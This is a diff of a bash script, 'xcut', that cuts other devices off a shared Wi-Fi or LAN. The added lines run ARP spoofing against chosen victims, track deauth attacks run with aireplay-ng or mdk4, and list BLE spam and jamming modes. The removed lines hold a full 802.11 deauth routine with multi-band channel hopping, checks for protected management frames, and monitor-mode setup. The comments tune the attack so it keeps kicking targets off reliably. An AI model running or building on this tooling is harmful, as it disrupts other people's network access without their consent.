@@ -11,6 +11,28 @@
 
 set -u
 
+die() { echo "error: $*" >&2; exit 1; }
+
+# ---- resolve the shared library dir (repo sibling, ~/.local/bin, or PATH) ----
+libdir() {
+    local self d
+    # BASH_SOURCE[0] works both executed and sourced (bats sources this file)
+    self="$(realpath "${BASH_SOURCE[0]:-$0}" 2>/dev/null || readlink -f "$0" 2>/dev/null || echo "$0")"
+    d="$(dirname "$self")"
+    for d in "$d/xcut-lib" "$HOME/.local/bin/xcut-lib" /usr/local/share/xcut/lib; do
+        [ -f "$d/deauth.sh" ] && { echo "$d"; return 0; }
+    done
+    return 1
+}
+XLIB="$(libdir)" || die "xcut-lib not found (expected deauth.sh in xcut-lib/ next to this script)"
+
+# shellcheck disable=SC1090
+. "$XLIB/vendor.sh"
+# shellcheck disable=SC1090
+. "$XLIB/wifi.sh"
+# shellcheck disable=SC1090
+. "$XLIB/deauth.sh"
+
 GW=""
 DEV=""
 MY=""
@@ -25,22 +47,47 @@ if [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != "root" ]; then
 else
     REAL_HOME="$HOME"
 fi
-CACHE_DIR="$REAL_HOME/.local/share/xcut"
+CACHE_DIR="${XCUT_CACHE_DIR:-$REAL_HOME/.local/share/xcut}"
 NETFILE="$CACHE_DIR/hosts.last"
+MC6FILE="$CACHE_DIR/hosts6.last"
 STATE="$CACHE_DIR/victims"
 EXCLUDE="$CACHE_DIR/exclude"
 
-die() { echo "error: $*" >&2; exit 1; }
+# ---- colored output (auto-off when piped / NO_COLOR set) ----
+if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
+    C_RED="\e[31m"; C_GREEN="\e[32m"; C_YEL="\e[33m"; C_CYN="\e[36m"; C_OFF="\e[0m"
+else
+    C_RED=""; C_GREEN=""; C_YEL=""; C_CYN=""; C_OFF=""
+fi
+
+json_str() {         # escape a string for JSON output
+    printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\t/\\t/g; s/\r//g'
+}
+
+# short advisory lock (flock, util-linux) so two xcut instances don't race on
+# NETFILE/EXCLUDE rewrites. deliberately NOT used around the long-running
+# cut loop - a SIGINT handler must never block on its own lock.
+lock_xcut() {
+    command -v flock >/dev/null 2>&1 || return 0
+    mkdir -p "$CACHE_DIR"
+    exec 9>"$CACHE_DIR/.lock"
+    flock 9 2>/dev/null
+}
+unlock_xcut() { command -v flock >/dev/null 2>&1 && flock -u 9 2>/dev/null; }
 
 usage() {
     cat <<'EOF'
 xcut - block Wi-Fi/LAN device access using ARP spoofing
 
 usage:
-  xcut scan               scan and list active devices (numbered)
-  xcut list               show last scan list
-  xcut cut  <nr|ip|all>   block one device / ip / every device
-  xcut uncut <nr|ip|all>  unblock one device (or all = same as stop)
+  xcut scan [-w] [--v6] [--json]   scan and list active devices (numbered)
+                            -w / --watch     rescan every WATCH_EVERY s (default 15)
+                            --v6             also probe IPv6 neighbors (NDP)
+                            --json           print the scan as JSON instead
+  xcut list [--json]       show last scan list
+  xcut status [--json]     show device count, what is blocked, deauth state
+  xcut cut  <nr|ip|all>    block one device / ip / every device
+  xcut uncut <nr|ip|all>   unblock one device (or all = same as stop)
   xcut stop               restore connectivity to everything
 
   xcut deauth <nr|ip|all> [iface] KICK device off WiFi and keep it off (monitor
@@ -66,40 +113,23 @@ usage:
   xcut exclude <nr|ip>    add a device to the exclude list
   xcut exclude -<nr|ip>   remove a device from the exclude list
 
-  xcut ble  on|off|raw <hex|scan>
-                            bluetooth BLE spam/find-my/ibeacon/eddystone
+  xcut ble  on|off|conn|jam|scan|burst
+                            bluetooth BLE spam / connectable-adv spam /
+                            soft-jam / scan
+
+scan envs:
+    WATCH_EVERY=30          rescan interval for -w/--watch (default 15)
+    SWEEP_PARALLEL=64       concurrent pings in the ping-sweep fallback
 EOF
     exit 0
 }
 
-get_netinfo() {
-    local line
-    line="$(ip route get 1.1.1.1 2>/dev/null | head -1)"
-    GW="$(echo "$line" | awk '/via/{print $3; exit}')"
-    DEV="$(echo "$line" | awk '/dev/{print $5; exit}')"
-    MY="$(echo "$line" | grep -o 'src [0-9.]*' | awk '{print $2}')"
-    [ -z "$DEV" ] && die "no active interface found"
-    [ -z "$MY" ] && MY="$(ip -4 -o addr show dev "$DEV" | awk '/inet/{split($4,a,"/");print a[1];exit}')"
-    [ -z "$GW" ] && GW="$(echo "$MY" | awk -F. '{print $1"."$2"."$3".1"}')"
-    SUBNET3="$(echo "$MY" | awk -F. '{print $1"."$2"."$3}')"
-}
-
-neigh_scan() {
-    ip neigh show dev "$DEV" | awk -v gw="$GW" -v me="$MY" '
-        $1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && ($2=="lladdr"||$3=="lladdr") {
-            mac = ($2=="lladdr") ? $3 : $4
-            state = $NF
-            if (state=="REACHABLE"||state=="STALE"||state=="DELAY"||state=="PROBE") {
-                if ($1!=gw && $1!=me) print $1, mac
-            }
-        }'
-}
-
-scan() {
+scan_once() {
     get_netinfo
     mkdir -p "$CACHE_DIR"
-    local tmp i ip mac
+    local tmp i ip mac name rest n
     tmp="$(mktemp)"
+    trap 'rm -f "${tmp:-}" 2>/dev/null' RETURN
     echo "Scanning ${SUBNET3}.1-254 via $DEV (router $GW) ..."
 
     if command -v arp-scan >/dev/null 2>&1; then
@@ -108,9 +138,20 @@ scan() {
             | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $2 ~ /^[0-9a-f:]{17}$/ {sub(/^ +/," ",$3); print $1, $2, substr($0, index($0,$3))}' \
             > "$tmp"
     else
-        echo "using ping sweep + neighbor table; better results with arp-scan:"
+        # ping sweep in bounded batches: 254 parallel pings can trip local
+        # ICMP rate limits / pids_max, and some routers silently drop the
+        # flood, so cap the concurrency (SWEEP_PARALLEL, default 64).
+        n="${SWEEP_PARALLEL:-64}"
+        case "$n" in
+            ''|*[!0-9]*) n=64 ;;
+        esac
+        [ "$n" -gt 0 ] || n=64
+        echo "using ping sweep + neighbor table (${n} concurrent); better results with arp-scan:"
         echo "  sudo pacman -S arp-scan"
-        for i in $(seq 1 254); do ( ping -c1 -W1 -i 0.2 "${SUBNET3}.$i" >/dev/null 2>&1 ) & done
+        for i in $(seq 1 254); do
+            ( ping -c1 -W1 -i 0.2 "${SUBNET3}.$i" >/dev/null 2>&1 ) &
+            [ $(( i % n )) -eq 0 ] && wait
+        done
         wait
         sleep 1
         neigh_scan > "$tmp"
@@ -122,39 +163,195 @@ scan() {
         sleep 2
     done
 
-    # dedupe by MAC, drop router/self, attach vendor/hostname
+    if [ "${WANT_V6:-0}" = "1" ]; then
+        # stimulate NDP (multicast all-nodes) + record IPv6 link-local neighbors
+        command -v ping >/dev/null 2>&1 \
+            && ping -6 -q -c 2 -W 1 -I "$DEV" ff02::1 >/dev/null 2>&1
+        v6_neigh > "$MC6FILE"
+    fi
+
+    # dedupe by MAC, drop router/self, attach vendor/hostname.
+    # NOTE: arp-scan's trailing description is the OUI VENDOR, not a hostname
+    # (it even says "(Unknown: locally administered)" for randomized MACs) -
+    # using it as the name would duplicate the Vendor column. Real names come
+    # from getent/avahi below.
+    lock_xcut
+    : > "$NETFILE"
     sort -u -k2,2 "$tmp" | while read -r ip mac rest; do
         [ "$ip" = "$GW" ] && continue
         [ "$ip" = "$MY" ] && continue
         [ -z "$mac" ] && continue
-        name=""
-        [ -n "${rest:-}" ] && name="$rest" \
-            || name="$(getent hosts "$ip" 2>/dev/null | awk '{print $2; exit}')"
+        name="$(getent hosts "$ip" 2>/dev/null | awk '{print $2; exit}')"
+        if [ -z "$name" ] && [ "${XCUT_NAMES:-1}" = "1" ] \
+           && command -v avahi-resolve-address >/dev/null 2>&1; then
+            name="$(timeout 2 avahi-resolve-address "$ip" 2>/dev/null | awk '{print $2; exit}')"
+        fi
         echo "$ip $mac $name"
-    done > "$NETFILE"
-    list_hosts
+    done >> "$NETFILE"
+    unlock_xcut
+    # bash RETURN traps are GLOBAL: leaving one set makes every later function
+    # return re-fire it, referencing a dead local -> "unbound variable" under
+    # set -u (seen in the wild). Clean up explicitly, and keep the trap string
+    # itself null-safe in case this function ever grows an early return.
+    rm -f "$tmp"
+    trap - RETURN
+}
+
+scan() {                 # xcut scan [-w] [--v6] [--json] [--interval=N]
+    local a
+    WANT_V6=0; WANT_JSON=0; WANT_WATCH=0
+    for a in "$@"; do
+        case "$a" in
+            -w|--watch)      WANT_WATCH=1 ;;
+            --v6|-6)         WANT_V6=1 ;;
+            --json)          WANT_JSON=1 ;;
+            --interval=*)    WATCH_EVERY="${a#*=}" ;;
+            "") ;;
+            *) die "unknown scan option: $a (see: xcut --help)" ;;
+        esac
+    done
+    if [ "${WANT_JSON:-0}" = "1" ]; then
+        scan_once >/dev/null 2>&1
+        list_hosts_json
+    elif [ "$WANT_WATCH" = "1" ]; then
+        watch_scan
+    else
+        scan_once
+        list_hosts
+    fi
+}
+
+## ---- watch mode: rescan every WATCH_EVERY s, print NEW/GONE diffs ----
+watch_scan() {
+    local intvl="${WATCH_EVERY:-15}" prev="" cur line n
+    [[ "$intvl" =~ ^[0-9]+$ ]] && [ "$intvl" -ge 1 ] || intvl=15
+    echo "== watch mode: rescan every ${intvl}s (Ctrl+C to stop) =="
+    while :; do
+        scan_once
+        cur="$(awk '{print $1}' "$NETFILE" 2>/dev/null | sort)"
+        if [ -n "$prev" ]; then
+            comm -13 <(printf '%s\n' "$prev") <(printf '%s\n' "$cur") | while read -r ip; do
+                [ -n "$ip" ] || continue
+                line="$(awk -v ip="$ip" '$1==ip{print; exit}' "$NETFILE")"
+                echo "  ${C_GREEN}NEW ${C_OFF} $line"
+            done
+            comm -23 <(printf '%s\n' "$prev") <(printf '%s\n' "$cur") | while read -r ip; do
+                [ -n "$ip" ] || continue
+                echo "  ${C_RED}GONE${C_OFF} $ip"
+            done
+        else
+            n="$(printf '%s\n' "$cur" | sed '/^$/d' | wc -l)"
+            echo "  initial snapshot: $n device(s) (diffs follow)"
+        fi
+        prev="$cur"
+        sleep "$intvl"
+    done
 }
 
 list_hosts() {
+    local i ip mac name v v6 extra
     if [ -s "$NETFILE" ]; then
-        printf '%-4s %-18s %-19s %s\n' "No." "IP" "MAC" "Name"
-        awk '{printf "%-4d %-18s %-19s %s\n", NR, $1, $2, ($3==""?"?":$3)}' "$NETFILE"
+        printf '%-5s %-16s %-18s %-14s %s\n' "No." "IP" "MAC" "Vendor" "Name / IPv6"
+        i=1
+        while read -r ip mac name; do
+            [ -z "$mac" ] && continue
+            v="$(vendor_of "$mac")"
+            v="${v:--}"
+            v6="$(awk -v m="$mac" '$1==m{print $2; exit}' "$MC6FILE" 2>/dev/null)"
+            extra="${name:-?}"
+            [ -n "$v6" ] && extra="$extra  [${v6}]"
+            printf '%-5d %-16s %-18s %-14s %s\n' "$i" "$ip" "$mac" "$v" "$extra"
+            i=$((i+1))
+        done < "$NETFILE"
     else
         echo "no scan results -> run: xcut scan"
     fi
     if [ -s "$STATE" ]; then
-        echo "== blocked:"
+        echo "== ${C_RED}blocked${C_OFF}:"
         awk '{printf "  %d  %s\n", NR, $1}' "$STATE"
         echo "  uncut with:  xcut uncut <nr|ip|all>"
     fi
+}
+
+list_hosts_json() {
+    local i=0 sep="" ip mac name v v6
+    printf '['
+    if [ -s "$NETFILE" ]; then
+        while read -r ip mac name; do
+            [ -z "$mac" ] && continue
+            v="$(vendor_of "$mac")"
+            v6="$(awk -v m="$mac" '$1==m{print $2; exit}' "$MC6FILE" 2>/dev/null)"
+            printf '%s{"no":%d,"ip":"%s","mac":"%s","ip6":"%s","name":"%s","vendor":"%s"}' \
+                "$sep" "$((i+1))" "$(json_str "$ip")" "$(json_str "$mac")" \
+                "$(json_str "$v6")" "$(json_str "$name")" "$(json_str "$v")"
+            sep=","
+            i=$((i+1))
+        done < "$NETFILE"
+    fi
+    echo ']'
+}
+
+## ---- status: what is going on right now (no root needed) ----
+cmd_status() {
+    local n=0 ip mac running=0
+    if [ -s "$NETFILE" ]; then
+        echo "devices : $(wc -l < "$NETFILE" | tr -d ' ')  (last scan: $(date -r "$NETFILE" '+%a %d %b %H:%M:%S' 2>/dev/null))"
+    else
+        echo "devices : none (run: xcut scan)"
+    fi
+    if [ -s "$STATE" ]; then
+        echo "${C_RED}blocked${C_OFF} (ARP spoof):"
+        while read -r ip; do
+            [ -n "$ip" ] || continue
+            n=$((n+1))
+            mac="$(awk -v ip="$ip" '$1==ip{print $2; exit}' "$NETFILE")"
+            printf '  %d  %-16s %-18s %s\n' "$n" "$ip" "${mac:--}" "$(vendor_of "$mac")"
+        done < "$STATE"
+        [ "$n" = "0" ] && echo "  none"
+    else
+        echo "blocked : none"
+    fi
+    pgrep -f "aireplay-ng .*--deauth" >/dev/null 2>&1 && running=1
+    pgrep -f "mdk4 .* d -b" >/dev/null 2>&1 && running=1
+    [ -s "$CACHE_DIR/deauth.pids" ] && running=1
+    if [ "$running" = "1" ]; then
+        echo "deauth  : ${C_RED}RUNNING${C_OFF}"
+        [ -s "$CACHE_DIR/deauth.list" ] && { echo "  targets:"; sed 's/^/    /' "$CACHE_DIR/deauth.list"; }
+    else
+        echo "deauth  : not running"
+    fi
+}
+
+status_json() {
+    local sep="" ip mac
+    printf '{"devices":'
+    [ -s "$NETFILE" ] && printf '%d' "$(wc -l < "$NETFILE" | tr -d ' ')" || printf '0'
+    printf ',"blocked":['
+    if [ -s "$STATE" ]; then
+        while read -r ip; do
+            [ -n "$ip" ] || continue
+            mac="$(awk -v ip="$ip" '$1==ip{print $2; exit}' "$NETFILE")"
+            printf '%s{"ip":"%s","mac":"%s"}' "$sep" "$(json_str "$ip")" "$(json_str "$mac")"
+            sep=","
+        done < "$STATE"
+    fi
+    printf '],"deauth":'
+    if pgrep -f "aireplay-ng .*--deauth" >/dev/null 2>&1 \
+       || pgrep -f "mdk4 .* d -b" >/dev/null 2>&1 \
+       || [ -s "$CACHE_DIR/deauth.pids" ]; then
+        printf '"running"'
+    else
+        printf '"stopped"'
+    fi
+    echo '}'
 }
 
 resolve_target() {
     local t="$1"
     case "$t" in
         all) echo "ALL";;
+        *[!0-9]*) echo "$t" ;;     # IP or MAC - pass through
         [0-9]*) awk -v n="$t" 'NR==n{print $1; exit}' "$NETFILE" ;;
-        *) echo "$t" ;;
     esac
 }
 
@@ -162,8 +359,8 @@ resolve_blocked() {
     local t="$1"
     case "$t" in
         all) echo "ALL";;
+        *[!0-9]*) echo "$t" ;;
         [0-9]*) awk -v n="$t" 'NR==n{print $1; exit}' "$STATE" ;;
-        *) echo "$t" ;;
     esac
 }
 
@@ -174,7 +371,7 @@ require_root() {
         # (observed: DEAUTH_ENGINE=mdk4 ran aireplay instead). Pass them
         # through explicitly as VAR=value arguments.
         local args=() v
-        for v in DEAUTH_GAP DEAUTH_ENGINE DEAUTH_BURST MDK4_RATE DEAUTH_HOP DEAUTH_MON DEAUTH_GENTLE DEAUTH_SEQ DEAUTH_SEQ_TIME; do
+        for v in DEAUTH_GAP DEAUTH_ENGINE DEAUTH_BURST MDK4_RATE DEAUTH_HOP DEAUTH_MON DEAUTH_GENTLE DEAUTH_SEQ DEAUTH_SEQ_TIME SWEEP_PARALLEL; do
             [ -n "${!v:-}" ] && args+=("${v}=${!v}")
         done
         exec sudo "${args[@]}" "$0" "$@"
@@ -191,11 +388,16 @@ require_arpspoof() {
 
 start_poison() {          # $1 = victim IP
     local v="$1"
+    grep -qx "$v" "$STATE" 2>/dev/null && { echo "already cut: $v"; return 0; }
     arpspoof -i "$DEV" -t "$v" "$GW" >/dev/null 2>&1 &
     arpspoof -i "$DEV" -t "$GW" "$v" >/dev/null 2>&1 &
     echo "$v" >> "$STATE"
     sleep 0.5
-    if ! pkill -0 -f "arpspoof -i $DEV" 2>/dev/null; then
+    # exact-match check on OUR two directions: a broad "-f arpspoof -i DEV"
+    # pattern also matched the "kill arpspoof" check itself / any other
+    # arpspoof on the same iface, so a dead process still read as alive.
+    if ! pgrep -f "arpspoof -i $DEV -t $v $GW" >/dev/null 2>&1 \
+       && ! pgrep -f "arpspoof -i $DEV -t $GW $v" >/dev/null 2>&1; then
         echo "  arpspoof failed to start for $v"
         return 1
     fi
@@ -251,6 +453,8 @@ uncut_target() {          # $1 = victim IP; root
 
 uncut_cmd() {
     local t="$1" obj
+    # missing/empty state file is a clean no-op - not a redirection error
+    [ -s "$STATE" ] || { echo "nothing is cut right now"; return 0; }
     obj="$(resolve_blocked "$t")"
     [ -n "$obj" ] || die "blocked list is empty"
     if [ "$obj" = "ALL" ]; then
@@ -307,794 +511,33 @@ cmd_exclude() {
     if [ "${arg:0:1}" = "-" ]; then
         ip="$(to_ip "${arg:1}")"
         [ -n "$ip" ] || die "no such entry"
+        lock_xcut
         [ -f "$EXCLUDE" ] && sed -i "\|^$ip$|d" "$EXCLUDE"
+        unlock_xcut
         echo "removed $ip from exclude list"
     else
         ip="$(to_ip "$arg")"
         [ -n "$ip" ] || die "no entry matching '$arg' (run: xcut list)"
+        lock_xcut
         grep -qx "$ip" "$EXCLUDE" 2>/dev/null || echo "$ip" >> "$EXCLUDE"
+        unlock_xcut
         echo "added $ip to exclude list (skipped by cut all / deauth all)"
     fi
 }
 
-# ---- deauth (guard against WiFi re-association) ----
-
-require_aireplay() {
-    command -v aireplay-ng >/dev/null 2>&1 || {
-        echo "aireplay-ng (aircrack-ng) is missing."
-        echo "install it with:  sudo pacman -S --noconfirm aircrack-ng"
-        exit 1
-    }
-}
-
-router_mac() {
-    local mac
-    mac="$(ip neigh show dev "$DEV" | awk -v g="$GW" '$1==g && $2=="lladdr"{print $3; exit}')"
-    if [ -z "$mac" ]; then
-        arping -q -c 1 -W 1 -I "$DEV" "$GW" >/dev/null 2>&1
-        sleep 0.5
-        mac="$(ip neigh show dev "$DEV" | awk -v g="$GW" '$1==g && $2=="lladdr"{print $3; exit}')"
-    fi
-    echo "$mac"
-}
-
-deauth_targets() {          # $1 = nr|ip|all  -> emits victim MACs
-    local t="$1"
-    if [ "$t" = "all" ]; then
-        awk -v gw="$GW" -v me="$MY" '$1!=gw && $1!=me{print $2}' "$NETFILE" \
-            | while read -r mac; do
-                [ -z "$mac" ] && continue
-                is_excluded "" "$mac" || echo "$mac"
-              done
-    else
-        local ip mac
-        ip="$(resolve_target "$t")"
-        [ -n "$ip" ] || die "target not found in last scan (run xcut scan)"
-        [ "$ip" = "$MY" ] && die "refusing to deauth this laptop ($MY)"
-        mac="$(awk -v ip="$ip" '$1==ip{print $2; exit}' "$NETFILE")"
-        is_excluded "$ip" "$mac" && die "refusing to deauth excluded device $ip (see: xcut exclude)"
-        [ -z "$mac" ] && die "no MAC known for $ip (run xcut scan)"
-        echo "$mac"
-    fi
-}
-
-wifi_ifaces() {             # -> all wireless interfaces (no p2p / monitor)
-    command -v iw >/dev/null 2>&1 || return 0
-    iw dev 2>/dev/null | awk '/^[[:space:]]*Interface/{print $2}' | grep -v '^p2p-'
-}
-
-connected_wifi() {          # -> the wireless iface actually linked to an AP
-    local i t
-    for i in $(wifi_ifaces); do
-        t="$(iw dev "$i" info 2>/dev/null | awk '/type/{print $2; exit}')"
-        [ "$t" = "monitor" ] && continue
-        if iw dev "$i" link 2>/dev/null | grep -q "^Connected"; then
-            echo "$i"
-            return
-        fi
-    done
-}
-
-iface_driver() {            # $1 = iface -> kernel driver name ("" if unknown)
-    local d
-    d="$(sed -n 's/^DRIVER=//p' "/sys/class/net/$1/device/uevent" 2>/dev/null | head -1)"
-    if [ -n "$d" ]; then echo "$d"; return; fi
-    # fallback: ethtool (some virtual/odd devices have no sysfs driver link)
-    command -v ethtool >/dev/null 2>&1 || return
-    ethtool -i "$1" 2>/dev/null | awk '/^driver:/{print $2}'
-}
-
-freq2ch() {                 # 5GHz/2.4GHz frequency -> channel number
-    local f="${1%%.*}"     # drop any ".0" from awk float output
-    case "$f" in
-        2412) echo 1;; 2417) echo 2;; 2422) echo 3;; 2427) echo 4;; 2432) echo 5;;
-        2437) echo 6;; 2442) echo 7;; 2447) echo 8;; 2452) echo 9;; 2457) echo 10;;
-        2462) echo 11;; 2467) echo 12;; 2472) echo 13;;
-        5[0-9][0-9][0-9]) echo $(( (10#$f - 5000) / 5 )) ;;
-    esac
-}
-
-new_fwerr() {               # $1 = baseline kernel ts -> only NEW iwlwifi error lines
-    local b="$1"
-    [ -n "$b" ] || return 0
-    dmesg 2>/dev/null | awk -v b="$b" '
-        /iwlwifi/ && /Microcode SW error|queue stuck|ADVANCED_SYSASSERT|assert|HCMD|command 0x[0-9a-f]+ failed|firmware.*(error|crashed)/ {
-            t = $0
-            sub(/^\[ */, "", t)
-            sub(/].*/, "", t)
-            if (t + 0 > b + 0) print
-        }' | tail -3
-}
-
-deauth_start() {            # $1 = nr|ip|all ; $2 = optional iface (root)
-    # Ctrl+C / SIGTERM at ANY point must clean up (monitor iface, NM state)
-    trap 'deauth_stop; exit 0' INT TERM
-    local macs ch apmac type m driver phy MONIF want ssid scan fwerr d pmf t freq cur state gap bcast alive lastline engine blist rate base tx0 tx1
-    MONIF="$DEV"
-    # dmesg baseline: only report firmware errors that happen DURING this run
-    # (dmesg is cumulative - old crashes from earlier runs must be ignored)
-    base="$(dmesg 2>/dev/null | sed -n 's/^\[ *\([0-9.]*\)\].*/\1/p' | tail -1 | tr -d ' ')"
-    want="${2:-}"
-    macs="$(deauth_targets "$1")"
-    [ -n "$macs" ] || die "no device match for '$1'"
-    ssid="$(iw dev "$DEV" link 2>/dev/null | awk '/SSID:/{print $2; exit}')"
-
-    # ---- adaptive: pick the best interface for the job ----
-    if [ -n "$want" ]; then
-        if ! iw dev "$want" info >/dev/null 2>&1; then
-            die "no such wireless interface '$want' (available: $(wifi_ifaces | tr '\n' ' '))"
-        fi
-        DEV="$want"
-    else
-        # deauth MUST run on a wireless interface - never on whatever the
-        # default route currently points at (a USB tether/ethernet link
-        # makes get_netinfo select it and deauth then fails with
-        # "did not enter monitor mode" on a non-wireless iface).
-        w="$(connected_wifi)"
-        [ -n "$w" ] && DEV="$w"
-        driver="$(iface_driver "$DEV")"
-        if [ "$driver" = "iwlwifi" ]; then
-            # prefer a non-iwlwifi (USB) adapter for deauth when one exists
-            for i in $(wifi_ifaces); do
-                [ "$i" = "$DEV" ] && continue
-                t="$(iw dev "$i" info 2>/dev/null | awk '/type/{print $2; exit}')"
-                [ "$t" = "monitor" ] && continue
-                d="$(iface_driver "$i")"
-                if [ -n "$d" ] && [ "$d" != "iwlwifi" ]; then
-                    echo "  adaptive: using $i (driver $d) instead of $DEV (iwlwifi)"
-                    DEV="$i"
-                    break
-                fi
-            done
-        fi
-    fi
-    driver="$(iface_driver "$DEV")"
-    # ssid must be re-read AFTER the adaptive picker changed DEV (get_netinfo
-    # may have selected a non-wireless route interface, leaving ssid empty)
-    ssid="$(iw dev "$DEV" link 2>/dev/null | awk '/SSID:/{print $2; exit}')"
-
-    # ---- adaptive: resolve BSSID + channel (link -> scan -> ARP) ----
-    apmac="$(iw dev "$DEV" link 2>/dev/null | awk '/^Connected to/{print $3}')"
-    ch="$(iw dev "$DEV" info 2>/dev/null | awk '/channel/{print $2; exit}')"
-    if [ -z "$apmac" ] && [ -n "$ssid" ]; then
-        echo "  adaptive: $DEV not connected - locating '$ssid' by scan ..."
-        scan="$(timeout 15 iw dev "$DEV" scan 2>/dev/null)"
-        apmac="$(echo "$scan" | awk -v s="$ssid" '
-            /^BSS /{bss=$2}
-            $1=="SSID:" && $2==s {print bss; exit}')"
-        if [ -z "$ch" ]; then
-            freq="$(echo "$scan" | awk -v s="$ssid" '
-                /^BSS /{bss=$2}
-                $1=="SSID:" && $2==s {seen=1}
-                seen && /freq:/ {print $2; exit}')"
-            [ -n "$freq" ] && ch="$(freq2ch "$freq")"
-        fi
-    fi
-    [ -n "$apmac" ] || apmac="$(router_mac)"
-    [ -n "$apmac" ] || die "could not resolve AP BSSID via $DEV"
-
-    # ---- multi-band: find sibling APs with the same base SSID ----
-    # "Kosan73(5G)" + "Kosan73(4G)" share the base name "Kosan73". Clients
-    # of the sibling AP live on a DIFFERENT channel, and iwlwifi's monitor
-    # sub-interface is locked to the connected AP's channel, so a single
-    # channel attack never reaches them. In 'all' mode we MAY channel-hop
-    # and hit every AP with the same base SSID (see hop_default below).
-    # Multi-band hopping (flipping the physical channel between the sibling
-    # APs) forces the card to re-tune constantly. On iwlwifi (Intel AX200/201,
-    # kernel bugzilla 214291) that channel-flapping is what triggers the
-    # ADVANCED_SYSASSERT / "Microcode SW error" crash mid-run - after which
-    # the link dies and no more deauth frames leave the card, so the attack
-    # silently stops kicking anyone. Default: NO hopping on iwlwifi - attack
-    # only the connected AP's channel via the monitor sub-interface (the
-    # behaviour that used to work reliably; your own WiFi also stays up).
-    # Force hopping back on with DEAUTH_HOP=1 (you lose your WiFi and risk
-    # the firmware crash), or use a USB adapter (Realtek RTL8812AU / mt76)
-    # which handles channel hopping fine.
-    hop_default=1
-    [ "$driver" = "iwlwifi" ] && hop_default=0
-    case "${DEAUTH_HOP:-}" in
-        1) hop_default=1 ;;
-        0) hop_default=0 ;;
-    esac
-    hoplist=""
-    if [ "$1" = "all" ] && [ "$hop_default" = "1" ]; then
-        base="$(echo "$ssid" | sed 's/[[:space:]]*([^()]*)$//')"
-        if [ -n "$base" ] && [ "$base" != "$ssid" ]; then
-            # always include the AP we are connected to, plus any siblings
-            # (format: "bssid channel" per line)
-            [ -n "$ch" ] && echo "$apmac $ch" > /tmp/xcut.hop.$$
-            scan_all="$(timeout 15 iw dev "$DEV" scan 2>/dev/null)"
-            while read -r b f s; do
-                [ -n "$b" ] || continue
-                [ "$b" = "$apmac" ] && continue
-                sb="$(echo "$s" | sed 's/[[:space:]]*([^()]*)$//')"
-                [ "$sb" = "$base" ] || continue
-                hc="$(freq2ch "$f")"
-                [ -n "$hc" ] || continue
-                echo "$b $hc" >> /tmp/xcut.hop.$$
-            done < <(echo "$scan_all" | awk '
-                function emit(){ if(b && f && s) print b, f, s }
-                /^BSS /{emit(); b=$2; sub(/\(.*/, "", b); f=""; s=""}
-                /freq:/{if(b && !f) f=$2}
-                /SSID:/{if(b && !s) s=$2}
-                END{emit()}
-            ')
-            hoplist="$(sort -u /tmp/xcut.hop.$$)"
-            rm -f /tmp/xcut.hop.$$
-        fi
-    fi
-
-    if [ "$1" = "all" ] && [ -z "$hoplist" ] && [ "$hop_default" = "0" ]; then
-        echo "  note: multi-band hopping disabled on iwlwifi - channel-flapping crashes"
-        echo "        the AX201 firmware and silently kills the attack. hitting only the"
-        echo "        connected AP '$ssid' (ch ${ch:-?}); sibling-AP clients are spared."
-        echo "        use DEAUTH_HOP=1 to force hopping, or a USB adapter (RTL8812AU/mt76)."
-    fi
-
-    echo "== kicking '$1' off AP '$ssid' ($apmac) via $DEV (channel ${ch:-?}) =="
-    echo "   WARNING: your own WiFi may stutter or drop while deauth runs."
-    echo "   restore with:  xcut deauth stop"
-    > "$CACHE_DIR/deauth.pids"
-    > "$CACHE_DIR/deauth.list"
-    > "$CACHE_DIR/deauth.log"
-
-    # 802.11w PMF check: if the AP requires protected management frames,
-    # clients IGNORE forged deauth by design - no aireplay card can win.
-    if command -v wpa_cli >/dev/null 2>&1; then
-        pmf="$(wpa_cli -i "$DEV" status 2>/dev/null | awk -F'=' '/^rsn_flags=/{print $2}')"
-        case "$pmf" in
-            *MFP_REQUIRED*)
-                echo "  WARNING: this AP requires 802.11w PMF - clients are trained to IGNORE"
-                echo "           forged deauth frames, so aireplay deauth cannot work here"
-                echo "           regardless of the wireless card. (xcut cut still works.)" ;;
-            *MFP_OPTIONAL*)
-                echo "  note: AP supports 802.11w PMF (optional) - most clients still accept"
-                echo "        deauth, but some may ignore it." ;;
-        esac
-    fi
-
-    # ---- staging: get an interface into monitor mode ----
-    # decide MONIF first (xcutmon vs $DEV) and save the cleanup state BEFORE
-    # any irreversible change, so Ctrl+C anywhere in staging still restores.
-    mon_mode="main"   # default; overwritten by the iwlwifi branch below
-    if [ -n "$hoplist" ]; then
-        # multi-band mode: must hop channels, and iwlwifi's sub-interface is
-        # locked to the connected AP's channel - so switch $DEV itself into
-        # monitor mode (your own WiFi drops, which 'all' mode already warns).
-        MONIF="$DEV"
-        iw dev xcutmon del 2>/dev/null
-        echo "  multi-band: $(echo "$hoplist" | wc -l) sibling AP(s) found - hopping channels"
-    elif [ "$driver" = "iwlwifi" ]; then
-        # sub-interface TX proved unreliable on this card (driver TX counter
-        # stayed 0 and nothing got kicked). DEFAULT to main-interface monitor -
-        # the configuration that actually kicked devices before (own WiFi drops
-        # while active). DEAUTH_MON=sub opts back into the sub-interface.
-        mon_mode="main"
-        case "${DEAUTH_MON:-}" in
-            sub) mon_mode="sub" ;;
-            main|"") mon_mode="main" ;;
-            *) echo "  (unknown DEAUTH_MON '$DEAUTH_MON' - expected main|sub, using main)" ;;
-        esac
-        if [ "$mon_mode" = "main" ]; then
-            echo "  adaptive: iwlwifi - switching $DEV itself to monitor (your WiFi drops while active)"
-            MONIF="$DEV"
-        else
-            phy="$(cat /sys/class/net/"$DEV"/phy80211/name 2>/dev/null || iw phy 2>/dev/null | awk '/^Wiphy/{print $2; exit}')"
-            iw dev xcutmon del 2>/dev/null   # clear stale leftovers from a crash
-            if [ -n "$phy" ] && iw phy "$phy" interface add xcutmon type monitor >/dev/null 2>&1; then
-                MONIF="xcutmon"
-            fi
-        fi
-    fi
-    echo "$DEV" > "$STATE.deauth"
-    echo "$MONIF" >> "$STATE.deauth"
-
-    nmcli dev set "$DEV" managed off >/dev/null 2>&1 || true
-    if [ "$driver" = "iwlwifi" ]; then
-        # power-save transitions stress the firmware during sustained TX
-        iw dev "$DEV" set power_save off 2>/dev/null || true
